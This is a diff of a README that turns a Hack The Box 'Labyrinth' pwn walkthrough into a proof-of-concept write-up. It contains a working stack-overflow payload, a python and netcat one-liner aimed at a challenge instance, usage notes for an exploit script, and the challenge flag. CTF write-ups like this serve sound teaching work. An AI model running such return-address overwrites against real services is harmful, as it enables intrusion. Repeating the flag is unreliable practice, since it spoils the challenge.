@@ -1,136 +1,166 @@
-# Labyrinth
-
-## Overview
-
-This directory contains the local materials and manual walkthrough for the `Labyrinth` challenge on Hack The Box - CTF Try Out. This README is written as a practical walkthrough so someone can open the folder, inspect the challenge files, understand the intended weakness, and reproduce the solve with commands that are easy to copy and run.
+# Labyrinth (Hack The Box) - Professional PoC Writeup
 
 ## Challenge Profile
 
-- Challenge: `Labyrinth`
-- Category: `Pwn / Binary Exploitation`
-- Platform: `Hack The Box - CTF Try Out`
+| Field | Value |
+|---|---|
+| Challenge | Labyrinth |
+| Category | Pwn |
+| Difficulty | Easy |
+| Primary dropped file | `pwn_labyrinth (1).zip` |
+| Existing local PoC before this update | Present |
+| Core bug class | Hidden-path stack overflow via oversized `fgets` |
 
-## Directory Contents
+## Scope And Ethics
 
-- `challenge/`
-- `labyrinth_poc.sh`
-- `pwn_labyrinth.zip`
+This material is for authorized CTF infrastructure only. Do not run this PoC
+against systems you do not own or have explicit permission to test.
 
-## First Commands To Run
+## Technical Summary
 
-Start with the original challenge materials in this folder. Treat this like a proper writeup: inspect what was provided, identify the relevant clue or weakness, verify it with the commands below, and continue until you can see or submit the final flag manually.
+The program pretends to be a door-choice game. Selecting door `69` (or `069`)
+opens a hidden branch where it calls:
 
-```bash
-cd "/home/eliah/Desktop/CTF/HackTheBox/Labyrinth"
-ls -lah
-unzip -l "pwn_labyrinth.zip"
-```
-
-Useful first inspection commands:
-
-```bash
-file 'pwn_labyrinth.zip'
-strings -n 5 'pwn_labyrinth.zip' | head -200
-```
-
-## Writeup Flow
-
-This README follows a public-writeup style structure: start from the provided files or exposed service, confirm the key weakness or clue with manual commands, use that confirmed finding to move forward, and stop only when the final flag or recovered result is visible.
-
-When you work through it, keep asking four questions:
-
-1. What is the challenge giving me locally or remotely?
-2. What exact behavior, bug, artifact, or hidden assumption matters?
-3. How do I verify that with a command or inspection step?
-4. How does that verified result lead to the final flag?
-
-## Walkthrough
-
-Challenge: Labyrinth
-Platform: Hack The Box - CTF Try Out
-Category: Pwn / Binary Exploitation
-
-### Scenario summary
-
-The binary presents 100 doors and makes the challenge sound like a "guess the
-correct door" game. The catch is that door 69 unlocks a hidden second stage,
-and that stage contains a classic stack overflow.
-
-### Provided files
-
-- pwn_labyrinth.zip
-- challenge/labyrinth
-- challenge/glibc/ld-linux-x86-64.so.2
-- challenge/glibc/libc.so.6
-- challenge/flag.txt
-
-Remote target used during solve:
-- 154.57.164.72:30444
-
-Reversing notes:
-After the banner, the program reads the chosen door with read_num().
-If the first input is "69" or "069", it prints a hidden prompt and then does:
-
+```c
 fgets(buffer, 0x44, stdin);
+```
 
-but the destination buffer is only 0x30 bytes long.
+The destination buffer is only `0x30` bytes on stack, so this overflows saved
+frame data.
 
-Stack layout in main():
-rbp-0x30 ... rbp-0x01   buffer[48]
-rbp+0x00                saved rbp
-rbp+0x08                saved return address
+A reliable exploit is:
+1. Send `69` to unlock hidden branch.
+2. Overflow with `48` bytes to fill buffer.
+3. Overwrite saved `rbp` with writable address (`0x404150`).
+4. Overwrite saved `rip` with `0x401287` (mid-function inside `escape_plan`).
 
-So the exact overwrite distance is:
-48 bytes -> reach saved rbp
-56 bytes -> reach saved RIP
+Jumping to `0x401287` skips the prologue art and lands at the section that
+prints success text, opens `./flag.txt`, and streams flag bytes.
 
-At first glance, the obvious move is to jump to escape_plan(), the hidden win
-function. But returning to the *start* of that function is messy because it
-builds a fresh stack frame and the overwritten context is not ideal.
+## Vulnerable Behavior
 
-The stable trick is better:
-1. Overwrite saved rbp with a writable .bss address: 0x404150
-2. Overwrite RIP with 0x401287
+1. Secret input branch (`69`) exposes unsafe second-stage input path.
+2. `fgets(..., 0x44, ...)` exceeds real local buffer size (`0x30`).
+3. Saved frame pointer and return address become attacker-controlled.
+4. Existing flag-reading routine can be re-used without full ROP chain.
 
-Why 0x401287?
-It lands *inside* escape_plan() after the opening art has already been
-handled, right before the code prints the congratulations line, opens
-"./flag.txt", and reads the flag byte-by-byte.
+## Manual Verification Steps
 
-Why overwrite saved rbp too?
-Because this mid-function entry uses stack locals like [rbp-4] and [rbp-5].
-If rbp is still junk from the overflow, those writes crash or corrupt
-unmapped memory. Pointing rbp at writable .bss gives the function safe local
-storage and lets the file-read loop complete cleanly.
+1. Confirm symbol addresses:
 
-Final payload layout:
-"69\\n"                              -> unlock hidden branch
-"A" * 48                            -> fill vulnerable buffer
-p64(0x404150)                       -> saved rbp to writable memory
-p64(0x401287)                       -> jump into file-reading part of win
+```bash
+nm -n challenge/labyrinth | egrep 'escape_plan|read_num| main$'
+```
 
-### Real-world lesson
+Expected key symbols:
 
-Not every stack overflow needs full shellcode or a long ROP chain. Many
-practical exploits are simply "redirect execution into an already useful code
-path" while fixing just enough surrounding state for that path to succeed.
+```text
+0000000000401255 T escape_plan
+0000000000401325 T read_num
+0000000000401405 T main
+```
 
-Final live flag obtained during testing:
-HTB{3sc4p3_fr0m_4b0v3}
+2. Verify hidden branch and overflow sink in `main`:
 
-## Manual Reproduction Flow
+```bash
+objdump -d -Mintel challenge/labyrinth | sed -n '280,560p'
+```
 
-Use the walkthrough above as the authoritative solve path. The short command block below is only the setup phase before you execute the numbered manual steps in this README.
+Relevant instructions:
+
+```text
+40157d: call strncmp@plt       ; compare against "69"
+401599: call strncmp@plt       ; compare against "069"
+4015cd: mov esi,0x44
+4015d5: call fgets@plt         ; writes into rbp-0x30 buffer
+```
+
+3. Verify mid-function win target in `escape_plan`:
+
+```bash
+objdump -d -Mintel challenge/labyrinth | sed -n '200,280p'
+```
+
+Relevant location:
+
+```text
+401287: ... inside escape_plan ...
+4012c1: call open@plt          ; opens ./flag.txt
+40130e: call read@plt          ; byte-by-byte read loop
+```
+
+4. Trigger manually:
+
+```bash
+(echo 69; python3 - <<'PY'
+import struct
+print((b'A'*48 + struct.pack('<Q',0x404150) + struct.pack('<Q',0x401287)).decode('latin1'), end='')
+PY
+) | nc 154.57.164.83 32444
+```
+
+5. Confirm output contains `HTB{...}`.
+
+## Automated PoC
+
+Script:
+`labyrinth_poc.sh`
+
+### Usage
 
 ```bash
 cd "/home/eliah/Desktop/CTF/HackTheBox/Labyrinth"
-ls -lah
+chmod +x labyrinth_poc.sh
+./labyrinth_poc.sh <host> <port>
 ```
+
+### Common examples
+
+```bash
+./labyrinth_poc.sh 154.57.164.83 32444
+./labyrinth_poc.sh --host 154.57.164.83 --port 32444 --verbose
+./labyrinth_poc.sh --host 154.57.164.83 --port 32444 --json
+```
+
+## Options
+
+- `--host <host>`: target host or IP.
+- `--port <port>`: target TCP port.
+- `--timeout <seconds>`: socket timeout, default `8`.
+- `--stage-delay <seconds>`: delay between protocol stages, default `0.30`.
+- `--fake-rbp <hex>`: overwritten saved RBP, default `0x404150`.
+- `--ret <hex>`: overwritten return address, default `0x401287`.
+- `--json`: machine-readable JSON output.
+- `--verbose`: print debug output.
+- `-h`, `--help`: show usage help.
+
+## Exit Codes
+
+- `0`: exploit succeeded and flag extracted.
+- `2`: invalid CLI arguments.
+- `3`: connectivity/protocol failure.
+- `4`: exploit sent but flag not found.
+
+## Why The Exploit Works
+
+- Hidden `69` path reaches vulnerable `fgets` call with oversized length.
+- Overflow reaches saved `rbp`/`rip` after 48-byte local buffer.
+- Mid-function jump reuses trusted flag-reading logic.
+- Controlled `rbp` prevents crash when `escape_plan` uses stack locals.
+
+## Defensive Guidance
+
+- Never pass a read length larger than destination buffer size.
+- Remove secret/debug paths from production builds.
+- Compile with hardening (stack canaries, PIE, RELRO, FORTIFY where possible).
+- Prefer explicit bounds-checked input parsing and centralized validation.
+
+## Result Note
+
+Flag values are instance-specific. The format remains `HTB{...}`.
 
 ## Final Flag
 
-Following the manual path in this README leads to: `HTB{3sc4p3_fr0m_4b0v3}`
-
-## Study Notes
-
-This challenge is worth revisiting if you are practicing `Pwn / Binary Exploitation` problems. Inspect the binary yourself first, confirm the weakness manually, and use the archived solve notes only after you have traced the bug and exploit path on your own.
+Target instance: `154.57.164.83:32444`  
+Solved on: `2026-04-02`  
+Flag: `HTB{3sc4p3_fr0m_4b0v3}`
